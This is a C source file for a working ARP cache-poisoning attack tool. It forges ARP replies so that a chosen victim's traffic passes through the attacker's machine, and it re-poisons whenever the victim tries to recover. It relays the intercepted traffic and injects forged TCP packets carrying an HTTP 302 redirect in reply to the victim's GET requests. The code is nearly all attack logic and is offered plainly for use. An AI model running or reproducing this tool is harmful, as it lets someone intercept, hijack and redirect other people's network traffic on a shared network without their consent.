#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>


#define MACADDR_FILE   "/sys/class/net/wlp1s0/address"
#define GATEWAY_FILE   "/proc/net/route"
#define NETWORK_NAME    "wlp1s0"
#define BUF_SIZE        32


#define REDIRECT_PKT   "HTTP/1.1 302 Found\r\n"\
                       "Location: https://en.wikipedia.org/wiki/HTTP_302\r\n"


struct route_info {
    char iface[IFNAMSIZ];
    unsigned int dest;
    unsigned int gateway;
    unsigned short flags;
    unsigned int refcnt;
    unsigned int use;
    unsigned int metric;
    unsigned int mask;
    unsigned int mtu;
    unsigned int window;
    unsigned int irtt;
} rtinfo;


struct pseudo_hdr
{
    struct in_addr src_ip;
    struct in_addr dst_ip;
    unsigned char zero;
    unsigned char protocol;
    unsigned short length;
};


struct ether_header eth_hdr;
struct arphdr arp_hdr;
struct ether_arp eth_arp;
struct in_addr my_ip, sender_ip, receiver_ip;

char *dev;
char errbuf[PCAP_ERRBUF_SIZE];

u_int8_t my_mac[ETH_ALEN], sender_mac[ETH_ALEN], receiver_mac[ETH_ALEN];
pcap_t *handle;


int setup_pcap()
{
    struct bpf_program fp;

    bpf_u_int32 mask;
    bpf_u_int32 net;

    char filter_exp[] = "";

    dev = pcap_lookupdev(errbuf);
    pcap_lookupnet(dev, &net, &mask, errbuf);

    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    pcap_compile(handle, &fp, filter_exp, 0, net);
    pcap_setfilter(handle, &fp);

    return 0;
}


void *cap_macaddress(void *arg)
{
    struct ether_header *eth_hdr;
    struct ether_arp *eth_arp;

    struct pcap_pkthdr header;
    const u_char *arp_rply;

    while( 1 ) {
        arp_rply = pcap_next(handle, &header);
        if(!arp_rply) continue;

        eth_hdr = (struct ether_header *)arp_rply;
        if(ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP) {
            eth_arp = (struct ether_arp *)(arp_rply + sizeof(struct ether_header));
            if(ntohs(eth_arp->ea_hdr.ar_op) == ARPOP_REPLY)   {
                if(!memcmp(eth_arp->arp_spa, &sender_ip, 4)) memcpy(sender_mac, eth_arp->arp_sha, ETH_ALEN);
                else if(!memcmp(eth_arp->arp_spa, &receiver_ip, 4)) memcpy(receiver_mac, eth_arp->arp_sha, ETH_ALEN);
                pthread_exit(NULL);
            }
        }
    }
}


void send_arprqst_pckt(struct in_addr *target_ip)
{
    u_char arp_rqst[sizeof(struct ether_header) + sizeof(struct ether_arp)];
    pthread_t tid;

    pthread_create(&tid, NULL, cap_macaddress, NULL);

    eth_hdr.ether_type  = htons(ETHERTYPE_ARP);
    memcpy(&eth_hdr.ether_shost, my_mac, ETH_ALEN);
    memset(&eth_hdr.ether_dhost, 0xFF, ETH_ALEN);

    arp_hdr.ar_hrd = htons(1);
    arp_hdr.ar_hln = 6;
    arp_hdr.ar_pro = htons(2048);
    arp_hdr.ar_pln = 4;
    arp_hdr.ar_op  = htons(ARPOP_REQUEST);

    eth_arp.ea_hdr = arp_hdr;
    memcpy(eth_arp.arp_sha, my_mac, ETH_ALEN);
    memcpy(eth_arp.arp_spa, &my_ip, 4);
    memset(eth_arp.arp_tha, 0x00, ETH_ALEN);
    memcpy(eth_arp.arp_tpa, target_ip, 4);

    memcpy(arp_rqst, &eth_hdr, sizeof(struct ether_header));
    memcpy(arp_rqst + sizeof(struct ether_header), &eth_arp, sizeof(struct ether_arp));

    pcap_sendpacket(handle, arp_rqst, sizeof(struct ether_header) + sizeof(struct ether_arp));
    pthread_join(tid, NULL);
}


void send_arprply_pckt(struct in_addr *target_ip, unsigned char *target_mac, struct in_addr *source_ip)
{
    u_char arp_rply_pckt[sizeof(struct ether_header) + sizeof(struct ether_arp)];

    eth_hdr.ether_type  = htons(ETHERTYPE_ARP);
    memcpy(&eth_hdr.ether_shost, my_mac, ETH_ALEN);
    memcpy(&eth_hdr.ether_dhost, target_mac, ETH_ALEN);

    arp_hdr.ar_hrd = htons(1);
    arp_hdr.ar_hln = 6;
    arp_hdr.ar_pro = htons(2048);
    arp_hdr.ar_pln = 4;
    arp_hdr.ar_op  = htons(ARPOP_REPLY);

    eth_arp.ea_hdr = arp_hdr;
    memcpy(eth_arp.arp_sha, my_mac, ETH_ALEN);
    memcpy(eth_arp.arp_spa, source_ip, 4);
    memcpy(eth_arp.arp_tha, target_mac, ETH_ALEN);
    memcpy(eth_arp.arp_tpa, target_ip, 4);

    memcpy(arp_rply_pckt, &eth_hdr, sizeof(struct ether_header));
    memcpy(arp_rply_pckt + sizeof(struct ether_header), &eth_arp, sizeof(struct ether_arp));

    pcap_sendpacket(handle, arp_rply_pckt, sizeof(struct ether_header) + sizeof(struct ether_arp));
}


void get_macandip()
{
    struct ifreq ifr;
    int sock;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, NETWORK_NAME, IFNAMSIZ-1);

    ioctl(sock, SIOCGIFHWADDR, &ifr);
    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

    ioctl(sock, SIOCGIFADDR, &ifr);
    memcpy(&my_ip, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 4);

    close(sock);
}


void get_receiverip()
{
    FILE *route_fp;
    char column[BUF_SIZE];

    route_fp = fopen(GATEWAY_FILE, "rt");
    while(fscanf(route_fp, "%s", column)) if(!strcmp(column, "IRTT")) break;
    while(1) {
        fscanf(route_fp, "%s\t%X\t%X\t%X\t%X\t%X\t%X\t%X\t%X\t%X\t%X",
               rtinfo.iface, &rtinfo.dest, &rtinfo.gateway, &rtinfo.flags,
               &rtinfo.refcnt, &rtinfo.use, &rtinfo.metric, &rtinfo.mask,
               &rtinfo.mtu, &rtinfo.window, &rtinfo.irtt);
        if(feof(route_fp)) break;
        if(rtinfo.dest == 0x00000000 && rtinfo.mask == 0x00000000) {
            memcpy(&receiver_ip, &rtinfo.gateway, 4); break;
        }
    }

    fclose(route_fp);
}


void get_vctmgwmac()
{
    send_arprqst_pckt(&receiver_ip);
    send_arprqst_pckt(&sender_ip);
}


void *infect_periodic(void *arg)
{
    while( 1 ) {
        send_arprply_pckt(&sender_ip, sender_mac, &receiver_ip);
        send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
        sleep(1);
    }
}


unsigned short ip_checksum(unsigned short *buf, int len)
{
    unsigned int data_len, checksum = 0;

    data_len = len * sizeof(unsigned short);
    while (len--)
        checksum += *buf++;

    if (data_len % 2) checksum += *buf++ & 0x00FF;

    checksum = (checksum >> 16) + (checksum & 0xFFFF);
    checksum += (checksum >> 16);

    return (unsigned short)(~checksum);
}


unsigned short tcp_checksum(const void *buff, size_t len, struct pseudo_hdr *phdr)
{
    const unsigned short *buf = buff;
    unsigned short *ip_src = (void *)&phdr->src_ip, *ip_dst = (void *)&phdr->dst_ip;
    unsigned short *protocol = (void *)&phdr->protocol;
    unsigned int checksum;
    size_t length = len;

    checksum = 0;
    while (len > 1)
    {
        checksum += *buf++;
        if (checksum & 0x80000000)
            checksum = (checksum & 0xFFFF) + (checksum >> 16);
        len -= 2;
    }

    if (len & 1)
        checksum += *((unsigned char *)buf);

    checksum += *(ip_src++);
    checksum += *ip_src;
    checksum += *(ip_dst++);
    checksum += *ip_dst;
    checksum += htons(*protocol);
    checksum += htons(length);

    while (checksum >> 16)
        checksum = (checksum & 0xFFFF) + (checksum >> 16);

    return (unsigned short)(~checksum);
}


void inject_redir_pkt(u_char *ijt_pkt)
{
    struct ether_header *eth_hdr;
    struct ip    *ip_hdr;
    struct tcphdr   *tcp_hdr;
    struct pseudo_hdr   phdr = {0, };

    struct in_addr ip_temp;

    u_int8_t mac_temp[ETH_ALEN];
    u_int16_t port_temp;

    int ijt_pkt_size;
    unsigned int temp;



    eth_hdr = (struct ether_header *)ijt_pkt;
    ip_hdr =  (struct ip *)(ijt_pkt + sizeof(struct ether_header));
    tcp_hdr = (struct tcphdr *)((u_char *)ip_hdr + ip_hdr->ip_hl * 4);

    ip_hdr->ip_len = htons(ip_hdr->ip_hl * 4 + tcp_hdr->doff * 4 + strlen(REDIRECT_PKT));
    ip_hdr->ip_ttl = 45;
    ip_hdr->ip_sum = 0;
    ip_hdr->ip_sum = ip_checksum((unsigned short *)ip_hdr, (ip_hdr->ip_hl * 4) / sizeof(unsigned short));

    memcpy(&phdr.src_ip, &ip_hdr->ip_src, sizeof(struct in_addr));
    memcpy(&phdr.dst_ip, &ip_hdr->ip_dst, sizeof(struct in_addr));
    memcpy(&phdr.protocol, &ip_hdr->ip_p, sizeof(u_int8_t));
    phdr.length = htons(tcp_hdr->doff * 4 + strlen(REDIRECT_PKT));

    tcp_hdr->fin   = 1;
    tcp_hdr->check = 0;
    tcp_hdr->check = tcp_checksum(tcp_hdr, tcp_hdr->doff * 4 + strlen(REDIRECT_PKT), &phdr);

    ijt_pkt_size = sizeof(struct ether_header) + ip_hdr->ip_hl * 4 + tcp_hdr->doff * 4 + strlen(REDIRECT_PKT);
    pcap_sendpacket(handle, ijt_pkt, ijt_pkt_size);
    
    memcpy(mac_temp, eth_hdr->ether_shost, ETH_ALEN);
    memcpy(eth_hdr->ether_shost, eth_hdr->ether_dhost, ETH_ALEN);
    memcpy(eth_hdr->ether_dhost, mac_temp, ETH_ALEN);

    memcpy(&ip_temp, &ip_hdr->ip_src, sizeof(struct in_addr));
    memcpy(&ip_hdr->ip_src, &ip_hdr->ip_dst, sizeof(struct in_addr));
    memcpy(&ip_hdr->ip_dst, &ip_temp, sizeof(struct in_addr));

    memcpy(&port_temp, &tcp_hdr->source, sizeof(u_int16_t));
    memcpy(&tcp_hdr->source, &tcp_hdr->dest, sizeof(u_int16_t));
    memcpy(&tcp_hdr->dest, &port_temp, sizeof(u_int16_t));

    temp = tcp_hdr->ack_seq;
    tcp_hdr->ack_seq = tcp_hdr->seq;
    tcp_hdr->seq     = temp;

    tcp_hdr->check= 0;
    tcp_hdr->check = tcp_checksum(tcp_hdr, tcp_hdr->doff * 4 + strlen(REDIRECT_PKT), &phdr);

    pcap_sendpacket(handle, ijt_pkt, ijt_pkt_size);
}


void *process_get_packet(void *arg)
{
    struct ip *ip_hdr;
    struct tcphdr *tcp_hdr;

    u_char *payload, *packet, *ijt_pkt;
    u_char *keyword, *field, *cursor;

    int field_len, ijt_pkt_size;


    packet = (u_char *)arg;


    ip_hdr = (struct ip *)(packet + sizeof(struct ether_header));
    tcp_hdr = (struct tcphdr *)(packet + sizeof(struct ether_header) + ip_hdr->ip_hl * 4);
    payload = (u_char *)tcp_hdr + tcp_hdr->doff * 4;


    keyword = strstr(payload, "Host");
    if(keyword != NULL) {
        for(cursor = keyword; *cursor != '\n'; cursor++);
        cursor++;

        field_len = (int)(cursor - keyword);  // +1 for null

        field = (char *)malloc(field_len);
        memcpy(field, keyword, field_len);
        field[field_len] = '\0';

        printf("%s", field);

        ijt_pkt_size = sizeof(struct ether_header) + ip_hdr->ip_hl * 4 + tcp_hdr->doff * 4 + strlen(REDIRECT_PKT);
        ijt_pkt = (u_char *)malloc(ijt_pkt_size);

        memcpy(ijt_pkt, packet, ijt_pkt_size - strlen(REDIRECT_PKT));
        memcpy(ijt_pkt + ijt_pkt_size - strlen(REDIRECT_PKT), REDIRECT_PKT, strlen(REDIRECT_PKT));

        inject_redir_pkt(ijt_pkt);
    }

    free(field);
    free(ijt_pkt);
    free(packet);

    pthread_exit(NULL);
}


void *prvnt_recov_dorelay(void *arg)
{
    pthread_t tid[2];


    struct pcap_pkthdr header;


    struct ether_arp *eth_arp;


    struct ether_header *eth_hdr;
    struct ip *ip_hdr;
    struct tcphdr *tcp_hdr;


    const u_char *packet, *payload;
    const char *keyword;

    u_char *copied_pkt, *relay_pckt;



    while( 1 ) {
        packet = pcap_next(handle, &header);
        if(!packet) continue;

        eth_hdr = (struct ether_header *)packet;

        /* prevent victim from recovering ARP */

        if(ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP) {

            eth_arp = (struct ether_arp *)(packet + sizeof(struct ether_header));

            if(ntohs(eth_arp->ea_hdr.ar_op) == ARPOP_REQUEST) {         // detected arp recovery
                send_arprply_pckt(&sender_ip, sender_mac, &receiver_ip);
                send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
            }
        }

        /* capture GET packet and redirect to other web */

        else if(ntohs(eth_hdr->ether_type) == ETHERTYPE_IP) {

            ip_hdr = (struct ip *)(packet + sizeof(struct ether_header));

            if(!memcmp(eth_hdr->ether_shost, sender_mac, ETH_ALEN)) {     /* from sender to receiver */
                if (ip_hdr->ip_p == IPPROTO_TCP) {

                    tcp_hdr = (struct tcphdr *)(packet + sizeof(struct ether_header) + ip_hdr->ip_hl * 4);
                    payload = (u_char *)tcp_hdr + tcp_hdr->doff * 4;

                    keyword = strstr(payload, "GET");
                    if(keyword != NULL) {
                        copied_pkt = (u_char *)malloc(header.len);
                        memcpy(copied_pkt, packet, header.len);
                        pthread_create(&tid[0], NULL, process_get_packet, (void *)copied_pkt);
                    }
                }
                relay_pckt = (u_char *)malloc(header.len);
                memcpy(relay_pckt, packet, header.len);
                memcpy(((struct ether_header *)relay_pckt)->ether_shost, my_mac, ETH_ALEN);
                memcpy(((struct ether_header *)relay_pckt)->ether_dhost, receiver_mac, ETH_ALEN);
                pcap_sendpacket(handle, relay_pckt, header.len);
                free(relay_pckt);
            }
            else if(!memcmp(eth_hdr->ether_shost, receiver_mac, ETH_ALEN) && !memcmp(&(ip_hdr->ip_dst), &sender_ip, 4)) {
                relay_pckt = (u_char *)malloc(header.len);              // from receiver to sender
                memcpy(relay_pckt, packet, header.len);
                memcpy(((struct ether_header *)relay_pckt)->ether_shost, my_mac, ETH_ALEN);
                memcpy(((struct ether_header *)relay_pckt)->ether_dhost, sender_mac, ETH_ALEN);
                pcap_sendpacket(handle, relay_pckt, header.len);
                free(relay_pckt);
            }
        }
    }
}


void infect()
{
    pthread_t tid[2];

    send_arprply_pckt(&sender_ip, sender_mac, &receiver_ip);
    send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);

    pthread_create(&tid[0], NULL, infect_periodic, NULL);
    pthread_create(&tid[1], NULL, prvnt_recov_dorelay, NULL);
}


int main(int argc, char *argv[])
{
    char my_ipaddr[INET_ADDRSTRLEN], sender_ipaddr[INET_ADDRSTRLEN];
    char receiver_ipaddr[INET_ADDRSTRLEN];
    char my_macaddr[ETH_ALEN * 2 + 6], sender_macaddr[ETH_ALEN * 2 + 6];
    char receiver_macaddr[ETH_ALEN * 2 + 6];

    int option, num_sessions = 0;

    if(argc != 2 ) {
        printf("USAGE : %s <VICTIM_IP>\n", argv[0]);
        return 1;
    }

    setup_pcap();

    strncpy(sender_ipaddr, argv[1], INET_ADDRSTRLEN);
    inet_pton(AF_INET, sender_ipaddr, &sender_ip.s_addr);

    printf("\n========== GETTING SENDER'S IP ===========\n\n");
    printf("SENDER'S IP\t: %s\n", sender_ipaddr);

    /* step 1. get my mac and ip address using ioctl */
    printf("\n============= GETTING MY IP ==============\n\n");
    get_macandip();
    inet_ntop(AF_INET, &my_ip.s_addr, my_ipaddr, INET_ADDRSTRLEN);
    ether_ntoa_r((struct ether_addr *)my_mac, my_macaddr);
    printf("MY IP\t\t: %s\n", my_ipaddr);
    printf("MY MAC\t\t: %s\n", my_macaddr);

    /* step 2. get ip address of receiver */
    printf("\n========== GETTING receiver'S IP =========\n\n");
    get_receiverip();
    inet_ntop(AF_INET, &receiver_ip.s_addr, receiver_ipaddr, INET_ADDRSTRLEN);
    printf("RECEIVER's IP\t: %s\n", receiver_ipaddr);

    /* step 3. send ARP request to sender and receiver and get sender's and receiver's MAC */
    printf("\n= GETTING SENDER AND receiver'S MAC ADDR =\n\n");
    get_vctmgwmac();
    ether_ntoa_r((struct ether_addr *)receiver_mac, receiver_macaddr);
    ether_ntoa_r((struct ether_addr *)sender_mac, sender_macaddr);
    printf("RECEIVER'S MAC\t\t: %s\n", receiver_macaddr);
    printf("SENDER'S MAC\t\t: %s\n", sender_macaddr);

    /* step 4. send infected ARP reply packet to sender and receiver */
    printf("\n======== INFECTING VICTIM(SENDER) ========\n");
    infect();
    printf("\n%s IS INFECTED ...\n", sender_ipaddr);

    while( 1 ) { }

    pcap_close(handle);
    return 0;
}